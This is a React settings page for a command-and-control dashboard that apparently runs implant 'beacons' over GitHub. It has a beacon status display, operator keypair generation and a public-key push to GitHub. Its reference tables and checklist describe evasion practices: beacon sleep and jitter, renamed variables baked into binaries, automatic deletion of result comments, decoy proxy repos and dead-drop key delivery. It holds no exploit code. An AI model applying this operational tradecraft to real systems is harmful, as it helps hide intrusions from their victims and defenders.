// dashboard/src/pages/SettingsPage.tsx
//
// Operator settings panel — connection info, GitHub repo, operator key status,
// OPSEC env-var reference table, keypair generation, and safety checklist.
// Read-only (except keygen); all values are derived from in-memory auth state and env vars.

import { useState, useEffect, useRef } from 'react';
import sodium from 'libsodium-wrappers';
import { useAuth } from '@/context/AuthContext';
import { getGitHubCoords } from '@/lib/coords';
import { C2ServerClient } from '@/lib/C2ServerClient';
import type { SSEEvent } from '@/lib/C2ServerClient';

// ── Row helper ────────────────────────────────────────────────────────────────

function Row({ label, value }: { label: string; value: string }) {
  return (
    <div className="flex gap-3 text-xs font-mono">
      <span className="text-gray-600 w-36 shrink-0">{label}</span>
      <span className="text-gray-300 break-all">{value}</span>
    </div>
  );
}

// ── Sections ──────────────────────────────────────────────────────────────────

function ConnectionSection() {
  const { mode, serverUrl, latencyMs, pat } = useAuth();
  const modeLabel =
    mode === 'live' ? `live (${latencyMs ?? '?'}ms)` : mode;

  const [liveBeaconCount, setLiveBeaconCount] = useState<number | null>(null);
  const [lastSseUpdate,   setLastSseUpdate]   = useState<Date | null>(null);
  const [secondsAgo,      setSecondsAgo]      = useState<number | null>(null);

  // SSE subscription in live mode
  useEffect(() => {
    if (mode !== 'live') return;
    const ctrl = new AbortController();
    void new C2ServerClient(serverUrl, pat).subscribeEvents((event: SSEEvent) => {
      if (event.type === 'beacon-update') {
        setLiveBeaconCount(event.beacons.length);
        setLastSseUpdate(new Date());
        setSecondsAgo(0);
      }
    }, ctrl.signal);
    return () => ctrl.abort();
  }, [mode, serverUrl, pat]);

  // Tick seconds-ago counter
  useEffect(() => {
    if (!lastSseUpdate) return;
    const id = setInterval(() => {
      setSecondsAgo(Math.floor((Date.now() - lastSseUpdate.getTime()) / 1000));
    }, 1000);
    return () => clearInterval(id);
  }, [lastSseUpdate]);

  const liveBeaconLabel = mode === 'live'
    ? (liveBeaconCount !== null ? String(liveBeaconCount) : '—')
    : '—';

  const lastSseLabel = mode === 'live'
    ? (secondsAgo !== null ? `${secondsAgo}s ago` : '—')
    : '—';

  return (
    <div className="space-y-2">
      <h3 className="text-[9px] text-gray-600 uppercase tracking-widest font-mono">
        Connection
      </h3>
      <div className="border border-octo-border rounded p-3 space-y-2">
        <Row label="Mode"           value={modeLabel} />
        <Row label="Server URL"     value={serverUrl} />
        <Row label="Live beacons"   value={liveBeaconLabel} />
        <Row label="Last SSE update" value={lastSseLabel} />
      </div>
    </div>
  );
}

function RepoSection() {
  const { owner, repo } = getGitHubCoords();
  return (
    <div className="space-y-2">
      <h3 className="text-[9px] text-gray-600 uppercase tracking-widest font-mono">
        C2 Repository
      </h3>
      <div className="border border-octo-border rounded p-3 space-y-2">
        <Row label="Owner" value={owner} />
        <Row label="Repo"  value={repo} />
      </div>
    </div>
  );
}

function OperatorKeySection() {
  const { privkey } = useAuth();
  const keyStatus = privkey
    ? `Loaded (${privkey.slice(0, 7)}…)`
    : 'Not loaded — results cannot be auto-decrypted';

  return (
    <div className="space-y-2">
      <h3 className="text-[9px] text-gray-600 uppercase tracking-widest font-mono">
        Operator Key
      </h3>
      <div className="border border-octo-border rounded p-3">
        <Row label="Key status" value={keyStatus} />
      </div>
    </div>
  );
}

// Server/operator-side env vars (set on the machine running the C2 server)
const OPSEC_VARS_SERVER: Array<{ name: string; desc: string; example: string }> = [
  {
    name:    'OCTOC2_CLEANUP_DAYS',
    desc:    'Delete result comments older than N days (0 = immediately)',
    example: '3',
  },
  {
    name:    'OCTOC2_APP_ID',
    desc:    'GitHub App ID (numeric) for App auth token rotation',
    example: '123456',
  },
  {
    name:    'OCTOC2_INSTALLATION_ID',
    desc:    'GitHub App Installation ID for the C2 repo',
    example: '987654',
  },
  {
    name:    'OCTOC2_PROXY_REPOS',
    desc:    'JSON array of OctoProxy decoy repo configs',
    example: '[{"owner":…}]',
  },
];

// Beacon-side env vars (injected at runtime or baked into the binary via build flags)
const OPSEC_VARS_BEACON: Array<{ name: string; desc: string; example: string }> = [
  {
    name:    'SVC_SLEEP',
    desc:    'Beacon checkin interval in seconds',
    example: '60',
  },
  {
    name:    'SVC_JITTER',
    desc:    'Sleep jitter fraction (0–1)',
    example: '0.3',
  },
  {
    name:    'SVC_APP_ID',
    desc:    'GitHub App ID baked into beacon binary (OPSEC-renamed)',
    example: '123456',
  },
  {
    name:    'SVC_INSTALLATION_ID',
    desc:    'GitHub App Installation ID baked into beacon binary',
    example: '987654',
  },
];

function OpsecVarTable({ vars }: { vars: Array<{ name: string; desc: string; example: string }> }) {
  return (
    <div className="border border-octo-border rounded overflow-hidden">
      <table className="w-full text-xs font-mono">
        <thead>
          <tr className="border-b border-octo-border/40">
            <th className="text-left text-[9px] text-gray-600 uppercase tracking-widest px-3 py-2 font-normal">
              Variable
            </th>
            <th className="text-left text-[9px] text-gray-600 uppercase tracking-widest px-3 py-2 font-normal">
              Purpose
            </th>
            <th className="text-left text-[9px] text-gray-600 uppercase tracking-widest px-3 py-2 font-normal hidden sm:table-cell">
              Example
            </th>
          </tr>
        </thead>
        <tbody>
          {vars.map(({ name, desc, example }) => (
            <tr key={name} className="border-b border-octo-border/40 last:border-0">
              <td className="px-3 py-2 text-octo-blue/70 whitespace-nowrap">{name}</td>
              <td className="px-3 py-2 text-gray-500">{desc}</td>
              <td className="px-3 py-2 text-gray-700 hidden sm:table-cell">{example}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

function OpsecReferenceSection() {
  return (
    <div className="space-y-2">
      <h3 className="text-[9px] text-gray-600 uppercase tracking-widest font-mono">
        OPSEC Reference
      </h3>
      <div className="space-y-3">
        <div className="space-y-1">
          <span className="text-[9px] text-gray-700 font-mono">Server / Operator (OCTOC2_*)</span>
          <OpsecVarTable vars={OPSEC_VARS_SERVER} />
        </div>
        <div className="space-y-1">
          <span className="text-[9px] text-gray-700 font-mono">Beacon runtime (SVC_*)</span>
          <OpsecVarTable vars={OPSEC_VARS_BEACON} />
        </div>
      </div>
    </div>
  );
}

// ── KeygenSection ─────────────────────────────────────────────────────────────

async function generateX25519Keypair(): Promise<{ publicKey: string; secretKey: string }> {
  await sodium.ready;
  const kp = sodium.crypto_kx_keypair();
  const publicKey = sodium.to_base64(kp.publicKey,  sodium.base64_variants.URLSAFE_NO_PADDING);
  const secretKey = sodium.to_base64(kp.privateKey, sodium.base64_variants.URLSAFE_NO_PADDING);
  return { publicKey, secretKey };
}

async function pushMonitoringPubkey(
  owner: string,
  repo: string,
  pat: string,
  pubkey: string,
): Promise<void> {
  const url = `https://api.github.com/repos/${owner}/${repo}/actions/variables/MONITORING_PUBKEY`;
  const body = JSON.stringify({ name: 'MONITORING_PUBKEY', value: pubkey });
  const headers = { Authorization: `Bearer ${pat}`, 'Content-Type': 'application/json' };

  let resp = await fetch(url, { method: 'PATCH', headers, body });
  if (resp.status === 404) {
    resp = await fetch(`https://api.github.com/repos/${owner}/${repo}/actions/variables`, {
      method: 'POST', headers, body,
    });
  }
  if (!resp.ok) {
    const text = await resp.text().catch(() => resp.statusText);
    throw new Error(`GitHub API ${resp.status}: ${text}`);
  }
}

type PushState = 'idle' | 'pushing' | 'pushed' | 'error';

function KeygenSection() {
  const { pat } = useAuth();
  const { owner, repo } = getGitHubCoords();

  const [pubkey,    setPubkey]    = useState<string | null>(null);
  const [privkey,   setPrivkey]   = useState<string | null>(null);
  const [busy,      setBusy]      = useState(false);
  const [copied,    setCopied]    = useState<'pub' | 'priv' | null>(null);
  const [pushState, setPushState] = useState<PushState>('idle');
  const [pushError, setPushError] = useState<string | null>(null);
  const pushTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  // Cleanup timer on unmount
  useEffect(() => {
    return () => {
      if (pushTimerRef.current) clearTimeout(pushTimerRef.current);
    };
  }, []);

  async function handleGenerate() {
    setBusy(true);
    try {
      const kp = await generateX25519Keypair();
      setPubkey(kp.publicKey);
      setPrivkey(kp.secretKey);
      setCopied(null);
      setPushState('idle');
      setPushError(null);
    } finally {
      setBusy(false);
    }
  }

  async function copyToClipboard(text: string, which: 'pub' | 'priv') {
    await navigator.clipboard.writeText(text);
    setCopied(which);
    setTimeout(() => setCopied(null), 2000);
  }

  async function handlePushPubkey() {
    if (!pubkey) return;
    setPushState('pushing');
    setPushError(null);
    try {
      await pushMonitoringPubkey(owner, repo, pat, pubkey);
      setPushState('pushed');
      if (pushTimerRef.current) clearTimeout(pushTimerRef.current);
      pushTimerRef.current = setTimeout(() => setPushState('idle'), 2000);
    } catch (err) {
      setPushState('error');
      setPushError((err as Error).message);
    }
  }

  return (
    <div className="space-y-2">
      <h3 className="text-[9px] text-gray-600 uppercase tracking-widest font-mono">
        Keypair Generation
      </h3>
      <div className="border border-octo-border rounded p-3 space-y-3">
        <button
          onClick={handleGenerate}
          disabled={busy}
          data-testid="keygen-btn"
          className="text-[10px] font-mono text-octo-blue hover:text-octo-blue/70 transition-colors tracking-wide disabled:opacity-50"
        >
          {busy ? 'Generating…' : 'Generate Operator Keypair'}
        </button>

        {pubkey && privkey && (
          <div className="space-y-3">
            {/* Public key */}
            <div className="space-y-1">
              <span className="text-[9px] text-gray-600 uppercase tracking-widest font-mono">
                Public Key (share with beacon builder)
              </span>
              <div className="flex items-center gap-2">
                <input
                  readOnly
                  value={pubkey}
                  aria-label="Public key"
                  className="flex-1 bg-transparent text-[10px] font-mono text-gray-300 border border-octo-border/40 rounded px-2 py-1 truncate"
                />
                <button
                  onClick={() => copyToClipboard(pubkey, 'pub')}
                  className="text-[9px] font-mono text-gray-500 hover:text-gray-300 whitespace-nowrap transition-colors"
                >
                  {copied === 'pub' ? 'Copied!' : 'Copy public key'}
                </button>
              </div>
            </div>

            {/* Private key */}
            <div className="space-y-1">
              <span className="text-[9px] text-gray-600 uppercase tracking-widest font-mono">
                Private Key
              </span>
              <div className="flex items-center gap-2">
                <input
                  readOnly
                  value={privkey}
                  aria-label="Private key"
                  className="flex-1 bg-transparent text-[10px] font-mono text-gray-300 border border-octo-border/40 rounded px-2 py-1 truncate"
                />
                <button
                  onClick={() => copyToClipboard(privkey, 'priv')}
                  className="text-[9px] font-mono text-gray-500 hover:text-gray-300 whitespace-nowrap transition-colors"
                >
                  {copied === 'priv' ? 'Copied!' : 'Copy private key'}
                </button>
              </div>
            </div>

            {/* Push MONITORING_PUBKEY button */}
            <div className="space-y-1">
              <button
                onClick={() => void handlePushPubkey()}
                disabled={pushState === 'pushing'}
                data-testid="push-pubkey-btn"
                className="text-[10px] font-mono text-octo-blue hover:text-octo-blue/70 transition-colors tracking-wide disabled:opacity-50"
              >
                {pushState === 'pushing' && 'Pushing…'}
                {pushState === 'pushed'  && '✓ Pushed to MONITORING_PUBKEY'}
                {pushState === 'idle'    && 'Push MONITORING_PUBKEY →'}
                {pushState === 'error'   && 'Push MONITORING_PUBKEY →'}
              </button>
              {pushState === 'error' && pushError && (
                <p
                  data-testid="push-pubkey-error"
                  className="text-[9px] font-mono text-red-400"
                >
                  ✗ Error: {pushError}
                </p>
              )}
            </div>

            <p className="text-[9px] font-mono text-yellow-600/80">
              ⚠ Store the private key securely — it cannot be recovered
            </p>
          </div>
        )}
      </div>
    </div>
  );
}

// ── SafetyChecklistSection ────────────────────────────────────────────────────

const SAFETY_ITEMS = [
  'C2 repo is private',
  'GitHub App auth (not PAT) configured',
  'App private key delivered via dead-drop (not baked in binary)',
  'OctoProxy relay active for target isolation',
  'OCTOC2_CLEANUP_DAYS set to 3 or less',
  'Dashboard not exposed publicly (local only)',
  'PAT scope limited to repo only',
  'E2E --fingerprint check passing',
];

function SafetyChecklistSection() {
  return (
    <div className="space-y-2">
      <h3 className="text-[9px] text-gray-600 uppercase tracking-widest font-mono">
        Safety Checklist
      </h3>
      <div className="border border-octo-border rounded p-3 space-y-1">
        {SAFETY_ITEMS.map((item) => (
          <div key={item} className="flex items-start gap-2 text-xs font-mono text-gray-500">
            <span className="text-green-600/70 shrink-0">✓</span>
            <span>{item}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

// ── SettingsPage ──────────────────────────────────────────────────────────────

export function SettingsPage() {
  const { logout } = useAuth();

  return (
    <div className="space-y-6 font-mono" aria-label="Settings">
      <h2 role="heading" className="text-xs text-gray-600 uppercase tracking-widest">
        Settings
      </h2>
      <ConnectionSection />
      <RepoSection />
      <OperatorKeySection />
      <OpsecReferenceSection />
      <KeygenSection />
      <SafetyChecklistSection />
      <div>
        <button
          onClick={logout}
          data-testid="logout-btn"
          className="text-[10px] text-red-500 hover:text-red-400 transition-colors tracking-wide font-mono"
        >
          Logout / Clear credentials
        </button>
      </div>
    </div>
  );
}
